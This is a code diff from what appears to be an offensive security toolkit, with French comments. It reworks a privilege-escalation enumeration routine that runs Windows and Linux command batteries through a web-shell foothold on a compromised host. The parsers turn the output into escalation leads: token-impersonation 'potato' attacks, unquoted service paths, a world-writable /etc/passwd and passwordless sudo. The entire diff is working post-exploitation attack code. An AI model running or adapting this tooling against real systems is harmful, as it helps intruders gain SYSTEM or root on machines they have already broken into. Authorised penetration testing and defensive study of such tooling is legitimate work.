@@ -444,8 +444,14 @@ def bin_fuzz_live(target, seed=None, iterations=200, max_total_s=120,
 
 
 # ── privesc battery through the existing web foothold ────────────────
+# AUDIT B1: shell_session exécute commands[:6] — une batterie de 8 ordres
+# perdait SILENCIEUSEMENT wmic + icacls (la source des unquoted paths!).
+# La batterie est donc CHUNCKÉE ≤6 par appel, et le parsing se fait PAR
+# COMMANDE sur l'output brut (les newlines réels) — plus jamais sur un
+# json.dumps où \n échappé tue les ancres ^...$ (AUDIT B5).
 _WIN_BATTERY = [
-    "whoami /all", "whoami /priv",
+    "whoami /all",
+    "whoami /priv",
     "cmd /c ver",
     "net localgroup administrators",
     "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v "
@@ -461,61 +467,75 @@ _LIN_BATTERY = [
     "cat /etc/crontab 2>/dev/null", "ls -la /etc/passwd", "env 2>/dev/null",
 ]
 
+_CMD_CHUNK = 6  # shell_session hard cap
 
-def _parse_battery_win(text: str) -> list:
-    """AUDIT-quality: pure parser — findings list from battery output."""
+
+def _parse_battery_win(results) -> list:
+    """Pure parser over [{cmd, output}] pairs — real newline text only."""
     findings = []
-    t = text or ""
-    if re.search(r"SeImpersonatePrivilege\s*\S", t) and \
-            "Disabled" not in t.split("SeImpersonatePrivilege")[1][:40]:
-        findings.append({"check": "SeImpersonatePrivilege ENABLED",
-                         "why": "potato family (Juicy/Hot/Sweet) — "
-                                "token impersonation to SYSTEM"})
-    if re.search(r"SeAssignPrimaryTokenPrivilege", t) and \
-            "Disabled" not in t.split("SeAssignPrimaryTokenPrivilege")[1][:40]:
-        findings.append({"check": "SeAssignPrimaryTokenPrivilege ENABLED",
-                         "why": "token privilege — SYSTEM spawn"})
-    if re.search(r"AlwaysInstallElevated\s+REG_DWORD\s+0x1", t):
-        findings.append({"check": "AlwaysInstallElevated = 1",
-                         "why": "any MSI installs as SYSTEM"})
-    for m in re.finditer(r"([A-Za-z]:\\[\w\s.\-()]+\\[\w\s.\-()]+\.exe)",
-                         t):
-        p = m.group(1).strip()
-        if (" " in p and not p.startswith('"')
-                and "Windows" not in p and "windows" not in p):
-            findings.append({"check": f"unquoted service path: {p}",
-                             "why": "plant exe at the space → service "
-                                    "restart = service account"})
-            break
-    if re.search(r"BUILTIN\\Administrators", t) and \
-            re.search(r"whoami\s*/(?:all|groups)[^\n]*", t) and \
-            re.search(r"(?i)\badministrators\b", t.split("net localgroup")[-1][:200]):
-        findings.append({"check": "current user in local Administrators",
-                         "why": "already admin (UAC matters) — done"})
+    for item in results or []:
+        out = (item.get("output") or "") if isinstance(item, dict) else ""
+        cmd = (item.get("cmd") or "") if isinstance(item, dict) else ""
+        if not out:
+            continue
+        # privileges — the potato gate
+        for priv, why in (("SeImpersonatePrivilege",
+                           "potato family (Juicy/Hot/Sweet) — token "
+                           "impersonation to SYSTEM"),
+                          ("SeAssignPrimaryTokenPrivilege",
+                           "token privilege — SYSTEM spawn")):
+            m = re.search(re.escape(priv) + r"[^\r\n]*", out)
+            if m and "Disabled" not in m.group(0):
+                findings.append({"check": f"{priv} ENABLED", "why": why})
+        if cmd.startswith("reg query") and \
+                re.search(r"AlwaysInstallElevated\s+REG_DWORD\s+0x1", out):
+            findings.append({"check": "AlwaysInstallElevated = 1",
+                             "why": "any MSI installs as SYSTEM"})
+        if cmd.startswith("wmic"):
+            for mp in re.finditer(r"([A-Za-z]:\\[^\r\n]*?\.exe)", out):
+                p = mp.group(1).strip()
+                if (" " in p and not p.startswith('"')
+                        and "windows" not in p.lower()):
+                    findings.append({
+                        "check": f"unquoted service path: {p}",
+                        "why": "plant exe at the space → service restart "
+                               "= service account"})
+                    break
+        if cmd.startswith("net localgroup") and \
+                re.search(r"(?i)administrators", out) and \
+                re.search(r"^[A-Za-z0-9_.\- ]{2,32}\s*$", out, re.M):
+            findings.append({"check": "local Administrators membership "
+                                      "(verify whoami against the list)",
+                             "why": "already admin (UAC matters) — done"})
     return findings
 
 
-def _parse_battery_lin(text: str) -> list:
+def _parse_battery_lin(results) -> list:
     findings = []
-    t = text or ""
-    if "NOPASSWD" in t:
-        findings.append({"check": "sudo NOPASSWD entries",
-                         "why": "passwordless sudo — see sudo -l output"})
-    if re.search(r"-rw-rw-rw-.*\s/etc/passwd", t):
-        findings.append({"check": "/etc/passwd world-writable",
-                         "why": "append root line directly"})
-    for m in re.finditer(r"^(/[\w./-]+)$", t, re.M):
-        p = m.group(1)
-        if re.search(r"(find|/bin/|/usr/bin/|env)", p):
+    for item in results or []:
+        out = (item.get("output") or "") if isinstance(item, dict) else ""
+        cmd = (item.get("cmd") or "") if isinstance(item, dict) else ""
+        if not out:
             continue
-        if p.startswith(("/usr/bin/su", "/bin/mount", "/usr/bin/sudo")):
-            continue
-        findings.append({"check": f"SUID binary: {p}",
-                         "why": "GTFOBins check needed"})
-        break
-    if re.search(r"\(ALL\s*:?\s*ALL\)", t) and "NOPASSWD" not in t:
-        findings.append({"check": "sudo ALL rights (needs password)",
-                         "why": "password reuse attack surface"})
+        if "NOPASSWD" in out:
+            findings.append({"check": "sudo NOPASSWD entries",
+                             "why": "passwordless sudo — see sudo -l output"})
+        if re.search(r"-rw-rw-rw-.*\s/etc/passwd", out):
+            findings.append({"check": "/etc/passwd world-writable",
+                             "why": "append root line directly"})
+        if cmd.startswith("find"):
+            for m in re.finditer(r"^(/[\w./-]+)$", out, re.M):
+                p = m.group(1)
+                if p.startswith(("/usr/bin/su", "/bin/mount", "/usr/bin/sudo",
+                                 "/usr/bin/passwd", "/bin/umount")):
+                    continue
+                findings.append({"check": f"SUID binary: {p}",
+                                 "why": "GTFOBins check needed"})
+                break
+        if "(ALL" in out and ":" in out and "NOPASSWD" not in out and \
+                cmd.startswith("sudo"):
+            findings.append({"check": "sudo ALL rights (needs password)",
+                             "why": "password reuse attack surface"})
     return findings
 
 
@@ -541,21 +561,35 @@ def privesc_enum(shell_url, param="cmd", os_flavor="auto"):
     if os_flavor == "auto":
         probe = shell_session(shell_url, commands=["cmd /c ver || uname -a"],
                               param=param)
-        probe_txt = str(probe)
-        os_flavor = "windows" if "Microsoft" in probe_txt or \
-            "Windows" in probe_txt else "linux"
+        try:
+            probe_data = json.loads(probe) if isinstance(probe, str) else probe
+            probe_txt = json.dumps(probe_data, ensure_ascii=False)
+        except Exception:
+            probe_txt = str(probe)
+        os_flavor = "windows" if "icrosoft" in probe_txt or \
+            "indows" in probe_txt else "linux"
     battery = _WIN_BATTERY if os_flavor == "windows" else _LIN_BATTERY
-    raw = shell_session(shell_url, commands=battery, param=param)
-    try:
-        data = json.loads(raw) if isinstance(raw, str) else raw
-        out_text = json.dumps(data, ensure_ascii=False)[:60000]
-    except Exception:
-        out_text = str(raw)[:60000]
-    findings = (_parse_battery_win(out_text) if os_flavor == "windows"
-                else _parse_battery_lin(out_text))
+    # AUDIT B1: shell_session executes commands[:6] — chunk the battery,
+    # or wmic/icacls (the unquoted-path SOURCE) silently never run.
+    all_results = []
+    for i in range(0, len(battery), _CMD_CHUNK):
+        chunk = battery[i:i + _CMD_CHUNK]
+        raw = shell_session(shell_url, commands=chunk, param=param)
+        try:
+            data = json.loads(raw) if isinstance(raw, str) else raw
+        except Exception:
+            continue
+        # results[] lives inside the verdict payload (top-level extra key)
+        chunk_results = (data.get("results") if isinstance(data, dict)
+                         else None) or []
+        all_results.extend(chunk_results)
+    findings = (_parse_battery_win(all_results) if os_flavor == "windows"
+                else _parse_battery_lin(all_results))
+    commands_run = len(all_results)
     exp = "partial" if findings else False
     return verdict("privesc_enum", exp,
                    f"{len(findings)} piste(s) d'escalade sur un foothold "
-                   f"{os_flavor}",
+                   f"{os_flavor} ({commands_run} commandes exécutées)",
                    evidence={"findings": findings},
-                   os_flavor=os_flavor, battery=len(battery))
+                   os_flavor=os_flavor, battery=len(battery),
+                   commands_run=commands_run)
